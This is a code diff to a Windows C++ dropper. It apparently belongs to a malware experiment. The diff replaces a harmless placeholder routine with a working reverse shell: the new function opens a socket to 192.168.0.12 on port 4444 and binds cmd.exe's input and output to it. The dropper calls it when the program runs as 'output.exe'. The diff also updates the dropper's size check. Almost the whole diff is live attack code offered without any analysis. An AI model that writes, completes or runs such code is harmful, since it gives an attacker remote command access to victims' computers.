@@ -32,11 +32,34 @@ void ExecuteProcessNewThread(LPWSTR command)
 	CloseHandle(pi.hThread);
 }
 
-void MaliciousFunction()
+void MaliciousReverseShell()
 {
-	// This is where the malware will perform some function once recreated into another area
-	cout << "[+] Hello from another directory ;)" << endl;
-	system("echo 'hello' > hello.txt");
+	WSADATA wsaData;
+	SOCKET s1;
+	struct sockaddr_in hax;
+	STARTUPINFO sui;
+	PROCESS_INFORMATION pi;
+
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+	hax.sin_family = AF_INET;
+	hax.sin_port = htons(4444); // port to make call back to
+	hax.sin_addr.s_addr = inet_addr("192.168.0.12"); // ip to make callback to
+
+	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+	memset(&sui, 0, sizeof(sui));
+	sui.cb = sizeof(sui);
+	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
+
+	std::cout << "[ ] Executing Reverse Shell" << std::endl;
+
+	TCHAR commandLine[256] = "cmd.exe";
+	// reverse shell that connects to IP
+	CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); 
+
 	system("pause");
 }
 
@@ -104,7 +127,7 @@ int checkit(int mysize, char *mybuf, char *target)
 {
 	int checker = 0;
 
-	if (mysize != 66560)
+	if (mysize != 81920)
 	{
 		cout << "[!] Size does not equal of target, extracting..." << endl;
 		extract(mysize, target);
@@ -140,7 +163,7 @@ void executeDropper(char *argv)
 	// compare the last 10 characters, if it equals the new binary, then run
 	if (_tcsncmp(strrchr(szFileName, '\0') - 10, "output.exe", 10) == 0)
 	{
-		MaliciousFunction();
+		MaliciousReverseShell();
 		return;
 	}
 	else {
